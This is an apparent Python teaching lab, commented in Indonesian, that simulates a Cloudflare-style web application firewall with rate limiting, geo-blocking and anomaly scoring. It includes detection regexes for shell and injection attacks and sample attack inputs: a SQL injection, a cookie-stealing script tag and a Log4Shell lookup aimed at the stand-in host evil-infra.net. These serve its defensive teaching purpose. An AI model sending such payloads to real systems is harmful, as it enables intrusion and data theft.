#!/usr/bin/env python3
"""
Lab Exercise: Cloudflare WAF & Managed Ruleset Engine Simulation
BAB-04: Web Application Firewall dan Managed Rulesets

Simulasi arsitektur produksi edge security Cloudflare:
- Custom Firewall Rules (Wirefilter expression evaluation)
- Cloudflare Managed Rulesets (Special Rules & Anomaly Scoring OWASP CRS v3.3)
- Rate Limiting Shield (Sliding window counter)
- Interactive Security Operations Center (SOC) CLI Console dengan ANSI Color
"""

import sys
import time
import re
import random
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

# ANSI Terminal Styling
C_RESET  = "\033[0m"
C_BOLD   = "\033[1m"
C_RED    = "\033[91m"
C_GREEN  = "\033[92m"
C_YELLOW = "\033[93m"
C_BLUE   = "\033[94m"
C_MAGENTA= "\033[95m"
C_CYAN   = "\033[96m"
C_WHITE  = "\033[97m"
C_DIM    = "\033[2m"

@dataclass
class HttpRequest:
    method: str
    path: str
    ip: str
    user_agent: str
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    country: str = "US"

@dataclass
class InspectionResult:
    action: str  # ALLOW, BLOCK, MANAGED_CHALLENGE, JS_CHALLENGE, LOG
    status_code: int
    matched_rule: Optional[str]
    rule_id: Optional[str]
    crs_score: int = 0
    paranoia_level: int = 1
    latency_ms: float = 0.0
    details: str = ""

class CloudflareRateLimiter:
    """Simulasi Cloudflare Advanced Rate Limiting dengan Sliding Window."""
    def __init__(self, threshold: int = 5, period_seconds: int = 10):
        self.threshold = threshold
        self.period_seconds = period_seconds
        self.request_records: Dict[str, List[float]] = {}

    def is_rate_limited(self, ip: str) -> Tuple[bool, int]:
        now = time.time()
        timestamps = self.request_records.get(ip, [])
        # Prune older than period
        timestamps = [ts for ts in timestamps if now - ts <= self.period_seconds]
        timestamps.append(now)
        self.request_records[ip] = timestamps
        count = len(timestamps)
        return (count > self.threshold, count)

class CloudflareWAFEngine:
    """Arsitektur Edge WAF Engine Cloudflare."""
    def __init__(self):
        self.paranoia_level = 1
        self.crs_threshold = 25  # In OWASP CRS: 5 = Low, 25 = Balanced
        self.rate_limiter = CloudflareRateLimiter(threshold=5, period_seconds=10)
        self.total_inspected = 0
        self.blocked_count = 0
        self.challenged_count = 0

        # Signatures untuk Cloudflare Managed Rulesets
        self.sqli_patterns = [
            (re.compile(r"(\%27)|(\')|(\-\-)|(\%23)|(#)", re.IGNORECASE), 10, "100001 - SQL Meta-Characters Detection"),
            (re.compile(r"\b(union(\s+all)?\s+select|select.*from|insert\s+into)\b", re.IGNORECASE), 15, "100002 - SQL Syntax Operator Injection"),
            (re.compile(r"\b(or|and)\s+[\d'\"]+=[\d'\"]+", re.IGNORECASE), 15, "100003 - SQL Boolean-Based Tautology"),
        ]

        self.xss_patterns = [
            (re.compile(r"<\s*script[^>]*>", re.IGNORECASE), 15, "100101 - Script Tag Injection"),
            (re.compile(r"javascript:\s*[^\s]+", re.IGNORECASE), 15, "100102 - URI Scheme Execution"),
            (re.compile(r"on(load|error|click|mouseover)\s*=", re.IGNORECASE), 10, "100103 - Inline Event Handler Payload"),
        ]

        self.rce_patterns = [
            (re.compile(r"\$\{jndi:(ldap[s]?|rmi|dns)://", re.IGNORECASE), 25, "100201 - Log4j CVE-2021-44228 JNDI Injection"),
            (re.compile(r"(/bin/sh|/bin/bash|cmd\.exe|powershell)", re.IGNORECASE), 20, "100202 - OS Shell Command Injection"),
            (re.compile(r"(\.\./|\.\.\\)", re.IGNORECASE), 10, "100203 - Directory Traversal LFI"),
        ]

    def evaluate(self, req: HttpRequest) -> InspectionResult:
        start_time = time.perf_counter()
        self.total_inspected += 1
        payload = f"{req.path} {req.body} {' '.join(req.headers.values())} {req.user_agent}"

        # 1. Custom WAF Rules: Geo-blocking & Bot User-Agent Filter
        if req.country in ["KP", "IR", "SY"]:
            latency = (time.perf_counter() - start_time) * 1000 + random.uniform(0.3, 0.9)
            self.blocked_count += 1
            return InspectionResult(
                action="BLOCK",
                status_code=403,
                matched_rule="Custom Firewall Rule: Sanctioned Geo-IP",
                rule_id="CF-CUSTOM-001",
                latency_ms=latency,
                details=f"Blocked traffic from restricted origin: {req.country}"
            )

        if "sqlmap" in req.user_agent.lower() or "nikto" in req.user_agent.lower():
            latency = (time.perf_counter() - start_time) * 1000 + random.uniform(0.4, 1.1)
            self.blocked_count += 1
            return InspectionResult(
                action="BLOCK",
                status_code=403,
                matched_rule="Custom Firewall Rule: Automated Vulnerability Scanner Tool",
                rule_id="CF-CUSTOM-002",
                latency_ms=latency,
                details=f"Identified malicious scanner user-agent: {req.user_agent}"
            )

        # 2. Rate Limiting Ruleset
        is_limited, hits = self.rate_limiter.is_rate_limited(req.ip)
        if is_limited:
            latency = (time.perf_counter() - start_time) * 1000 + random.uniform(0.2, 0.6)
            self.challenged_count += 1
            return InspectionResult(
                action="MANAGED_CHALLENGE",
                status_code=429,
                matched_rule="Cloudflare Advanced Rate Limiting Shield",
                rule_id="CF-RATE-001",
                latency_ms=latency,
                details=f"Threshold breached ({hits} requests / 10s window). Serving Cloudflare Turnstile."
            )

        # 3. Cloudflare Managed Ruleset (OWASP CRS Anomaly Scoring)
        total_crs_score = 0
        trigger_reasons = []

        all_rules = self.sqli_patterns + self.xss_patterns + self.rce_patterns
        for pattern, score_weight, rule_name in all_rules:
            if pattern.search(payload):
                total_crs_score += score_weight
                trigger_reasons.append(rule_name)

        latency = (time.perf_counter() - start_time) * 1000 + random.uniform(0.8, 1.8)

        if total_crs_score >= self.crs_threshold:
            self.blocked_count += 1
            return InspectionResult(
                action="BLOCK",
                status_code=403,
                matched_rule="Cloudflare Managed Ruleset - Critical Anomaly Exceeded",
                rule_id="CF-MANAGED-CRS",
                crs_score=total_crs_score,
                paranoia_level=self.paranoia_level,
                latency_ms=latency,
                details=f"Anomaly Score [{total_crs_score}/{self.crs_threshold}]. Triggers: {', '.join(trigger_reasons)}"
            )
        elif total_crs_score > 0 and total_crs_score < self.crs_threshold:
            self.challenged_count += 1
            return InspectionResult(
                action="JS_CHALLENGE",
                status_code=401,
                matched_rule="Cloudflare Managed Ruleset - Suspicious Anomaly",
                rule_id="CF-MANAGED-SUSP",
                crs_score=total_crs_score,
                paranoia_level=self.paranoia_level,
                latency_ms=latency,
                details=f"Sub-critical Anomaly Score [{total_crs_score}/{self.crs_threshold}]. Verifying human browser."
            )

        # 4. Clean Traffic Allowed to Origin Upstream
        return InspectionResult(
            action="ALLOW",
            status_code=200,
            matched_rule=None,
            rule_id=None,
            crs_score=0,
            paranoia_level=self.paranoia_level,
            latency_ms=latency,
            details="Traffic passed all edge inspection rulesets. Proxying to origin cluster."
        )

def print_banner():
    banner = f"""
{C_CYAN}================================================================================
{C_BOLD}  CLOUDFLARE EDGE WAF & MANAGED RULESETS - PRODUCTION ARCHITECTURE LAB
{C_RESET}{C_CYAN}  Enterprise Edge Threat Defense & Anomaly Scoring Inspector (Python Simulation)
================================================================================{C_RESET}
"""
    print(banner)

def render_result(req: HttpRequest, res: InspectionResult):
    print(f"\n{C_BOLD}{C_WHITE}--- [EDGE INGRESS EVALUATION] ---{C_RESET}")
    print(f"{C_DIM}Source IP   :{C_RESET} {req.ip} ({req.country})")
    print(f"{C_DIM}Endpoint    :{C_RESET} {req.method} {req.path}")
    print(f"{C_DIM}User-Agent  :{C_RESET} {req.user_agent}")
    if req.body:
        print(f"{C_DIM}Payload Body:{C_RESET} {req.body}")

    # Action Styling
    if res.action == "ALLOW":
        badge = f"{C_GREEN}{C_BOLD}[ PASS: ALLOW 200 OK ]{C_RESET}"
    elif res.action == "BLOCK":
        badge = f"{C_RED}{C_BOLD}[ HIT: BLOCKED {res.status_code} FORBIDDEN ]{C_RESET}"
    elif res.action == "MANAGED_CHALLENGE":
        badge = f"{C_YELLOW}{C_BOLD}[ CHALLENGE: TURNSTILE CAPTCHA {res.status_code} ]{C_RESET}"
    else:
        badge = f"{C_MAGENTA}{C_BOLD}[ CHALLENGE: JAVASCRIPT SOLVER {res.status_code} ]{C_RESET}"

    print(f"\n{C_BOLD}Decision     :{C_RESET} {badge}")
    print(f"{C_BOLD}Edge Latency :{C_RESET} {C_CYAN}{res.latency_ms:.2f} ms{C_RESET}")
    if res.matched_rule:
        print(f"{C_BOLD}Rule Tag     :{C_RESET} {C_RED}{res.matched_rule} ({res.rule_id}){C_RESET}")
    print(f"{C_BOLD}CRS Score    :{C_RESET} {res.crs_score} (Threshold: {25})")
    print(f"{C_BOLD}Log Reason   :{C_RESET} {res.details}")
    print(f"{C_CYAN}--------------------------------------------------------------------------------{C_RESET}\n")

def run_interactive_lab():
    engine = CloudflareWAFEngine()
    print_banner()

    menu = f"""
{C_BOLD}{C_WHITE}PILIH SKENARIO PENYERANGAN ATAU TEST TRAFFIC:{C_RESET}
  {C_GREEN}1.{C_RESET} Valid Clean Request (HTTP GET /api/v1/products)
  {C_RED}2.{C_RESET} SQL Injection Attack (Payload: ' OR 1=1 --)
  {C_RED}3.{C_RESET} Cross-Site Scripting (XSS) Attack (Payload: <script>alert(document.cookie)</script>)
  {C_RED}4.{C_RESET} Log4Shell Zero-Day Exploitation (${{jndi:ldap://evil-infra.net/payload}})
  {C_YELLOW}5.{C_RESET} Automated Scanner Probe (User-Agent: sqlmap/1.6.4#stable)
  {C_YELLOW}6.{C_RESET} Burst Flood Rate Limiting (5+ consecutive requests)
  {C_MAGENTA}7.{C_RESET} Geolocation Sanction Check (Origin Country: IR/KP)
  {C_CYAN}8.{C_RESET} Custom Interactive Payload Tester
  {C_WHITE}9.{C_RESET} Tampilkan Metrik & Edge Security Statistics
  {C_DIM}0. Keluar dari Lab{C_RESET}
"""

    while True:
        print(menu)
        choice = input(f"{C_BOLD}{C_CYAN}Enter Choice [0-9]: {C_RESET}").strip()

        if choice == "0":
            print(f"\n{C_GREEN}Lab sesi selesai. Edge security operational review verified.{C_RESET}")
            break

        elif choice == "1":
            req = HttpRequest(
                method="GET",
                path="/api/v1/products?category=hardware&sort=desc",
                ip="203.0.113.15",
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                country="ID"
            )
            res = engine.evaluate(req)
            render_result(req, res)

        elif choice == "2":
            req = HttpRequest(
                method="POST",
                path="/api/v1/login",
                ip="198.51.100.42",
                user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
                body="username=admin' OR 1=1 --&password=invalidpassword",
                country="US"
            )
            res = engine.evaluate(req)
            render_result(req, res)

        elif choice == "3":
            req = HttpRequest(
                method="GET",
                path="/search?q=<script>alert(document.cookie)</script>",
                ip="198.51.100.89",
                user_agent="Mozilla/5.0 (X11; Linux x86_64)",
                country="DE"
            )
            res = engine.evaluate(req)
            render_result(req, res)

        elif choice == "4":
            req = HttpRequest(
                method="GET",
                path="/api/auth",
                ip="45.33.32.156",
                user_agent="${jndi:ldap://evil-infra.net/rce_payload}",
                headers={"X-Forwarded-Host": "victim.org"},
                country="RU"
            )
            res = engine.evaluate(req)
            render_result(req, res)

        elif choice == "5":
            req = HttpRequest(
                method="GET",
                path="/items.php?id=1",
                ip="185.220.101.5",
                user_agent="sqlmap/1.6.4#stable (https://sqlmap.org)",
                country="NL"
            )
            res = engine.evaluate(req)
            render_result(req, res)

        elif choice == "6":
            flood_ip = "192.0.2.77"
            print(f"\n{C_YELLOW}[!] Mengirimkan 7 request berurutan dari IP: {flood_ip}...{C_RESET}")
            for i in range(1, 8):
                req = HttpRequest(
                    method="POST",
                    path="/api/v1/auth/token",
                    ip=flood_ip,
                    user_agent="curl/7.88.1",
                    body='{"grant_type":"client_credentials"}',
                    country="SG"
                )
                res = engine.evaluate(req)
                color = C_GREEN if res.action == "ALLOW" else C_YELLOW
                print(f"Request #{i}: {color}{res.action} ({res.status_code}){C_RESET} -> {res.details}")
                time.sleep(0.15)
            print()

        elif choice == "7":
            req = HttpRequest(
                method="GET",
                path="/checkout/payment",
                ip="175.45.176.10",
                user_agent="Mozilla/5.0",
                country="KP"
            )
            res = engine.evaluate(req)
            render_result(req, res)

        elif choice == "8":
            print(f"\n{C_BOLD}--- Manual Request Payload Injector ---{C_RESET}")
            method = input("HTTP Method [GET/POST]: ").strip().upper() or "GET"
            path = input("Request Path & Query [/search?q=test]: ").strip() or "/search?q=test"
            body = input("Body payload (opsional): ").strip()
            ua = input("User Agent (opsional): ").strip() or "Mozilla/5.0 ManualTester"
            country = input("Origin Country code [2 letters, cth: ID, US, KP]: ").strip().upper() or "ID"

            req = HttpRequest(
                method=method,
                path=path,
                ip="203.0.113.99",
                user_agent=ua,
                body=body,
                country=country
            )
            res = engine.evaluate(req)
            render_result(req, res)

        elif choice == "9":
            print(f"\n{C_BOLD}{C_WHITE}--- CLOUDFLARE EDGE TELEMETRY & METRICS ---{C_RESET}")
            print(f"Total Requests Inspected : {C_CYAN}{engine.total_inspected}{C_RESET}")
            print(f"Total Blocked (403)      : {C_RED}{engine.blocked_count}{C_RESET}")
            print(f"Total Challenged (429/401): {C_YELLOW}{engine.challenged_count}{C_RESET}")
            allowed = engine.total_inspected - engine.blocked_count - engine.challenged_count
            print(f"Total Passed to Origin   : {C_GREEN}{allowed}{C_RESET}")
            mitigation_rate = 0.0
            if engine.total_inspected > 0:
                mitigation_rate = ((engine.blocked_count + engine.challenged_count) / engine.total_inspected) * 100
            print(f"Edge Threat Mitigation % : {C_MAGENTA}{mitigation_rate:.1f}%{C_RESET}")
            print(f"{C_CYAN}--------------------------------------------{C_RESET}\n")

        else:
            print(f"{C_RED}[!] Pilihan tidak valid. Silakan coba lagi.{C_RESET}\n")

if __name__ == "__main__":
    try:
        run_interactive_lab()
    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}Lab dihentikan oleh pengguna.{C_RESET}")
        sys.exit(0)
